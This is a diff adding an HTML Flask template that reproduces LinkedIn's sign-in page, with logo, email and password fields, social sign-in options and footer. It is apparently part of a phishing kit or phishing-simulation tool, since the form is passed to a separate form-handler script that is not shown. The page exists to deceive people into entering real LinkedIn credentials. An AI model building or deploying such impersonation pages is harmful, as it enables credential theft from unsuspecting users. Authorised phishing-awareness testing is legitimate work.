@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LinkedIn Login, Sign in | LinkedIn</title>
+    <link rel="shortcut icon" href="{{ url_for('static', filename='images/linkedin/favicon.ico') }}"
+        type="image/x-icon" />
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles/linkedin.css') }}" />
+
+</head>
+
+<body>
+    <header>
+        <img src="{{ url_for('static', filename='images/linkedin/logo.svg') }}" alt="logo">
+    </header>
+    <div class="main">
+        <div class="container">
+            <div class="header">
+                <h1>Sign in</h1>
+                <p>Stay updated on your professional world</p>
+            </div>
+            <form class="form" id="form">
+                <div class="input-container">
+                    <input type="text" name="username" required>
+                    <label>Email or Phone</label>
+                </div>
+                <div class="input-container mb-0">
+                    <input type="password" name="password" required id="password">
+                    <label>Password</label>
+                    <div class="show-password">show</div>
+                </div>
+                <div class="forgot-password">
+                    <span>Forgot password?</span>
+                </div>
+                <div class="btn-container">
+                    <button type="submit">Sign in</button>
+                </div>
+            </form>
+            <div class="more">
+                <div class="seperator">
+                    <div class="seperator-line"></div>
+                    <span>or</span>
+                    <div class="seperator-line"></div>
+                </div>
+                <p class="policies">
+                    By clicking Continue, you agree to LinkedIn&#39;s
+                    <span>User Agreement</span>,
+                    <span>Privacy Policy </span>
+                    , and
+                    <span>Cookie Policy</span>.
+                </p>
+
+                <div class="more-link">
+                    <img src="{{ url_for('static', filename='images/linkedin/google.svg') }}" alt="google"
+                        class="more-link-img">
+                    <span>Continue with Google</span>
+                </div>
+                <div class="more-link">
+                    <img src="{{ url_for('static', filename='images/linkedin/apple.svg') }}" alt="apple">
+                    <span>Sign in with Apple</span>
+                </div>
+                <div class="more-link">
+                    <img src="{{ url_for('static', filename='images/linkedin/link.svg') }}" alt="link">
+                    <span>Sign in with a one-time link</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="sign-up">
+            New to LinkedIn?
+            <span>Join now</span>
+        </div>
+    </div>
+    <footer>
+        <ul>
+            <li class="footer-logo">
+                <img src="{{ url_for('static', filename='images/linkedin/linkedin-black.svg') }}" alt="linkedin-black">
+                <span>&copy; 2024</span>
+            </li>
+            <li>User Agreement</li>
+            <li>Privacy Policy</li>
+            <li>Community Guidelines</li>
+            <li>Cookie Policy</li>
+            <li>Copyright Policy</li>
+            <li>Send Feedback</li>
+            <li>Language</li>
+        </ul>
+    </footer>
+
+    <script src="{{ url_for('static', filename='scripts/formHandler.js') }}"></script>
+
+    <!-- Individual template javascript -->
+    <script>
+        const show_btn = document.querySelector('.show-password');
+        const password = document.querySelector('#password');
+        show_btn.addEventListener('click', () => {
+            if (password.type === 'password') {
+                password.type = 'text';
+                show_btn.innerHTML = 'hide';
+            }
+            else {
+                password.type = 'password';
+                show_btn.innerHTML = 'show';
+            }
+        })
+    </script>
+</body>
+
+</html>
